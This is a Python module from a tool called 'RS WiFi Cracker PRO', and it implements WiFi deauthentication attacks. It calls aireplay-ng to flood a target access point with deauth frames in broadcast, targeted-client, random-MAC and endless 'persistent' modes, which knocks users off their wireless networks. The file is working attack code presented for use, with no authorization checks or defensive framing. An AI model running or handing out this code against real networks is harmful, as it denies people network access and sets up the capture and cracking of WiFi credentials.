#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO v4.0 - Deauth Attack Module"""

import os
import sys
import time
import random
import subprocess
import threading
from typing import Dict, List, Optional
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import Logger

logger = Logger('Deauth')


@dataclass
class DeauthResult:
    success: bool
    bssid: str
    client: str
    packets_sent: int = 0
    duration: float = 0.0
    error: str = ""


class DeauthAttacker:
    """WiFi Deauthentication Attack Suite"""
    
    BROADCAST = "FF:FF:FF:FF:FF:FF"
    
    def __init__(self, interface: str):
        self.interface = interface
        self.process = None
        self.running = False
        self.packets_sent = 0
        self.stats = {'attacks': 0, 'packets_sent': 0, 'clients_deauthed': 0}
    
    def attack(self, bssid: str, mode: str = "broadcast", count: int = 10,
               client: str = None) -> DeauthResult:
        """Execute deauth attack"""
        self.stats['attacks'] += 1
        self.running = True
        start_time = time.time()
        
        if mode == "targeted" and client:
            result = self._send_deauth(bssid, client, count)
        elif mode == "broadcast":
            result = self._send_deauth(bssid, self.BROADCAST, count)
        elif mode == "random":
            result = self._deauth_random(bssid, count)
        elif mode == "persistent":
            result = self._deauth_persistent(bssid)
        else:
            result = self._send_deauth(bssid, self.BROADCAST, count)
        
        result.duration = time.time() - start_time
        self.stats['packets_sent'] += result.packets_sent
        
        return result
    
    def _send_deauth(self, bssid: str, client: str, count: int) -> DeauthResult:
        """Send deauth packets"""
        try:
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count),
                   '-a', bssid, '-c', client, self.interface]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.process.wait(timeout=30)
            
            return DeauthResult(success=True, bssid=bssid, client=client, packets_sent=count)
        
        except subprocess.TimeoutExpired:
            self.process.terminate()
            return DeauthResult(success=True, bssid=bssid, client=client, packets_sent=count)
        except FileNotFoundError:
            return DeauthResult(success=False, bssid=bssid, client=client, error="aireplay-ng not found")
        except Exception as e:
            return DeauthResult(success=False, bssid=bssid, client=client, error=str(e))
    
    def _deauth_random(self, bssid: str, count: int) -> DeauthResult:
        """Deauth random clients"""
        total = 0
        for _ in range(count):
            mac = self._random_mac()
            result = self._send_deauth(bssid, mac, 1)
            total += result.packets_sent
        return DeauthResult(success=True, bssid=bssid, client="random", packets_sent=total)
    
    def _deauth_persistent(self, bssid: str) -> DeauthResult:
        """Continuous deauth"""
        self.packets_sent = 0
        while self.running:
            result = self._send_deauth(bssid, self.BROADCAST, 1)
            self.packets_sent += result.packets_sent
            time.sleep(0.1)
        return DeauthResult(success=True, bssid=bssid, client=self.BROADCAST, packets_sent=self.packets_sent)
    
    def _random_mac(self) -> str:
        mac = [random.randint(0x00, 0xff) for _ in range(6)]
        return ':'.join(f'{b:02x}' for b in mac)
    
    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()
    
    def get_stats(self) -> Dict: return self.stats.copy()
